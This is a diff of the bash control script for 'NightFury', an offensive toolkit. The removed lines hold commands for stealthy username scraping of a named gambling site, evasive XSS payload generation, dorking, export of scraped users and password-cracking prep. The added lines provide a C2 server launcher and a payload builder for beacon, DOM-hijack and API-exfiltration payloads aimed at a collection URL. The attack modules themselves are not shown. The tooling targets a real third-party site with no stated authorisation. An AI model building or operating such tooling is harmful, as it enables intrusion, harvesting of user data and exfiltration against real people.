@@ -1,29 +1,26 @@
 #!/bin/bash
 #
-# NightFury Framework - Master Control Script
-# Professional Red Team Operations Platform
-#
-# Usage: nightfury.sh [command] [options]
+# NightFury SHEBA Framework - v2.6 (2026 Edition)
+# Master Control Script for WSL2 Kali Linux
 #
 
 set -e
 
 # Configuration
 NIGHTFURY_HOME="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
-NIGHTFURY_CONFIG="${NIGHTFURY_HOME}/config"
-NIGHTFURY_LOGS="${NIGHTFURY_HOME}/logs"
-NIGHTFURY_DATA="${NIGHTFURY_HOME}/data"
+CONFIG_FILE="${NIGHTFURY_HOME}/config/operators.yaml"
+PYTHON_CMD="python3"
 
 # Colors
-RED='\033[0;31m'
-GREEN='\033[0;32m'
-YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
-CYAN='\033[0;36m'
+GREEN='\033[0;32m'
+RED='\033[0;31m'
+YELLOW='\033[1;33m'
+BOLD='\033[1m'
 NC='\033[0m'
 
-# Functions
 print_banner() {
+    echo -e "${BLUE}${BOLD}"
     cat << "EOF"
     ███╗   ██╗██╗ ██████╗ ██╗  ██╗████████╗███████╗██╗   ██╗██████╗ ██╗   ██╗
     ████╗  ██║██║██╔════╝ ██║  ██║╚══██╔══╝██╔════╝██║   ██║██╔══██╗╚██╗ ██╔╝
@@ -31,121 +28,76 @@ print_banner() {
     ██║╚██╗██║██║██║   ██║██╔══██║   ██║   ██╔══╝  ██║   ██║██╔══██╗  ╚██╔╝  
     ██║ ╚████║██║╚██████╔╝██║  ██║   ██║   ██║     ╚██████╔╝██║  ██║   ██║   
     ╚═╝  ╚═══╝╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
-                        Professional Red Team Operations Framework
-                                    Version 2.6 (SHEBA-Protected)
 EOF
+    echo -e "                        Professional Red Team Operations Framework${NC}"
+    echo -e "                                    Version 2.6 (SHEBA-Protected)\n"
 }
 
-print_info() { echo -e "${BLUE}[*]${NC} $1"; }
-print_success() { echo -e "${GREEN}[+]${NC} $1"; }
-print_error() { echo -e "${RED}[!]${NC} $1"; }
+# --- Core Commands ---
 
-# Authentication Check
-check_auth() {
-    local codeword="$1"
+cmd_setup() {
     export PYTHONPATH="${NIGHTFURY_HOME}:${PYTHONPATH}"
-    python3 -c "from core.auth_manager import SHEBAAuthManager; auth = SHEBAAuthManager(); auth.enforce_access('$codeword')"
+    $PYTHON_CMD "${NIGHTFURY_HOME}/core/interactive_setup.py"
 }
 
-# Command: Scrape Users
-cmd_scrape() {
-    local domain="${1:-runehall.com}"
-    local codeword="$2"
-    check_auth "$codeword"
-    
-    print_info "Starting stealthy user scraping for $domain..."
-    export PYTHONPATH="${NIGHTFURY_HOME}:${PYTHONPATH}"
-    local output_file="${NIGHTFURY_DATA}/exports/scraped_users.json"
-    python3 -c "from modules.recon_pro.user_scraper import UserScraper; s = UserScraper('$domain'); users = s.scrape_users(); import json; print(json.dumps(users, indent=2)); open('$output_file', 'w').write(json.dumps(users))"
-    print_success "Users saved to: $output_file"
+cmd_status() {
+    if [[ ! -f "$CONFIG_FILE" ]]; then
+        echo -e "${RED}[!] Framework not configured. Run './nightfury.sh setup' first.${NC}"
+        exit 1
+    fi
+    echo -e "${GREEN}[+] NightFury Framework Status:${NC}"
+    $PYTHON_CMD -c "import yaml; c = yaml.safe_load(open('$CONFIG_FILE')); print(f'    Operator: {c.get(\"operator_name\")}\n    C2 Host: {c.get(\"c2_host\")}:{c.get(\"c2_port\")}\n    WSL Sync: {c.get(\"wsl_integration\")}')"
 }
 
-# Command: GitHub Export
-cmd_xssgen() {
-    local count="${1:-10}"
-    local codeword="$2"
-    check_auth "$codeword"
-
-    print_info "Generating $count evasive XSS payloads..."
-    export PYTHONPATH="${NIGHTFURY_HOME}:${PYTHONPATH}"
-    python3 -c "from modules.exploit_pro.xss_generator import XSSGenerator; gen = XSSGenerator(); payloads = gen.generate_evasive_payloads(count=$count); import json; print(json.dumps(payloads, indent=2))"
-    print_success "XSS payload generation complete."
+cmd_c2() {
+    local action=$1
+    if [[ "$action" == "start" ]]; then
+        echo -e "${BLUE}[*] Starting NightFury C2 Server...${NC}"
+        export PYTHONPATH="${NIGHTFURY_HOME}:${PYTHONPATH}"
+        nohup $PYTHON_CMD "${NIGHTFURY_HOME}/core/c2_server.py" > "${NIGHTFURY_HOME}/logs/c2_server.log" 2>&1 &
+        echo -e "${GREEN}[+] C2 Server running in background (PID: $!).${NC}"
+    elif [[ "$action" == "stop" ]]; then
+        echo -e "${YELLOW}[*] Stopping C2 Server...${NC}"
+        pkill -f "core/c2_server.py" || true
+        echo -e "${GREEN}[+] C2 Server stopped.${NC}"
+    else
+        echo -e "${RED}[!] Usage: ./nightfury.sh c2 [start|stop]${NC}"
+    fi
 }
 
-cmd_dork() {
-    local domain="$1"
-    local codeword="$2"
-    check_auth "$codeword"
-
-    if [[ -z "$domain" ]]; then
-        print_error "Usage: nightfury.sh dork <domain> <codeword>"
+cmd_payload() {
+    local type=$1
+    local url=$2
+    if [[ -z "$type" || -z "$url" ]]; then
+        echo -e "${RED}[!] Usage: ./nightfury.sh payload [web_beacon|dom_hijack|api_exfil] <c2_url>${NC}"
         return 1
     fi
-
-    print_info "Executing Google dorks for $domain..."
     export PYTHONPATH="${NIGHTFURY_HOME}:${PYTHONPATH}"
-    python3 -c "from modules.osint_engine.google_dorking import GoogleDorkEngine; engine = GoogleDorkEngine(); results = engine.execute_dorks(\"$domain\"); import json; print(json.dumps(results, indent=2)); export_path = engine.export_dorks(\"$domain\", format=\'json\'); print(f\"[+] Dorks exported to: {export_path}\")"
-    print_success "Google dorking complete for $domain."
+    $PYTHON_CMD -c "from modules.exploit.jit_payload_gen import JITPayloadGenerator; gen = JITPayloadGenerator(); print(gen.build_payload('$type', c2_url='$url'))"
 }
 
-cmd_export() {
-    local file_path="$1"
-    local codeword="$2"
-    check_auth "$codeword"
-    
-    if [[ -z "$file_path" ]]; then
-        print_error "Usage: nightfury.sh export <file_path> <codeword>"
-        return 1
-    fi
-    
-    print_info "Exporting $file_path to GitHub..."
-    export PYTHONPATH="${NIGHTFURY_HOME}:${PYTHONPATH}"
-    python3 -c "from utilities.github_exporter import GitHubExporter; e = GitHubExporter(); e.export_file('$file_path')"
-}
-
-# Command: Help
 cmd_help() {
-    cat << EOF
-NightFury SHEBA-Protected - Command Reference
-
-CORE:
-  status <codeword>           Show framework status
-  scrape <domain> <codeword>  Stealthy username scraping
-  xssgen [count] <codeword>   Generate evasive XSS payloads
-  dork <domain> <codeword>    Execute Google dorks for a domain
-  export <file> <codeword>    Automated GitHub export
-  c2 [start|stop] <codeword>  Manage C2 Collection Server
-  crackprep <cmd> <codeword>  Prepare data for password cracking
-  runehall <cmd> <codeword>   RuneHall.com Specialized Plugin
-  panic                       Emergency cleanup and exit
-
-NOTE:
-  All sensitive commands require the 'SHEBA' codeword for access.
-
-EXAMPLES:
-  nightfury.sh scrape runehall.com SHEBA
-  nightfury.sh export data/exports/scraped_users.json SHEBA
-EOF
+    print_banner
+    echo -e "${BOLD}COMMANDS:${NC}"
+    echo -e "  setup              Run the interactive setup wizard"
+    echo -e "  status             Show framework and operator status"
+    echo -e "  c2 [start|stop]    Manage the C2 collection server"
+    echo -e "  payload <type> <uL> Generate a JIT-compiled payload"
+    echo -e "  recon <domain>     Execute advanced OSINT & dorking"
+    echo -e "  panic              Emergency cleanup and secure exit"
+    echo -e ""
+    echo -e "${BOLD}EXAMPLES:${NC}"
+    echo -e "  ./nightfury.sh setup"
+    echo -e "  ./nightfury.sh payload web_beacon http://10.0.0.5:8080/collect"
 }
 
-# Main command dispatcher
-main() {
-    mkdir -p "${NIGHTFURY_LOGS}" "${NIGHTFURY_DATA}/exports" "${NIGHTFURY_DATA}/reports"
-    local command="${1:-help}"
-    shift || true
-    case "$command" in
-        scrape) cmd_scrape "$@" ;;
-        xssgen) cmd_xssgen "$@" ;;
-        dork) cmd_dork "$@" ;;
-        export) cmd_export "$@" ;;
-        c2|crackprep|runehall|status|health) 
-            # These commands now require codeword as the last argument
-            # For simplicity in this shell wrapper, we just pass all args
-            # and let the python core handle the auth check.
-            cmd_"$command" "$@" ;;
-        help|--help|-h) print_banner; cmd_help ;;
-        *) print_error "Unknown command: $command"; exit 1 ;;
-    esac
-}
+# --- Main ---
 
-main "$@"
+case "$1" in
+    setup)   cmd_setup ;;
+    status)  cmd_status ;;
+    c2)      cmd_c2 "$2" ;;
+    payload) cmd_payload "$2" "$3" ;;
+    help|--help|-h|"") cmd_help ;;
+    *)       echo -e "${RED}[!] Unknown command: $1${NC}"; cmd_help; exit 1 ;;
+esac
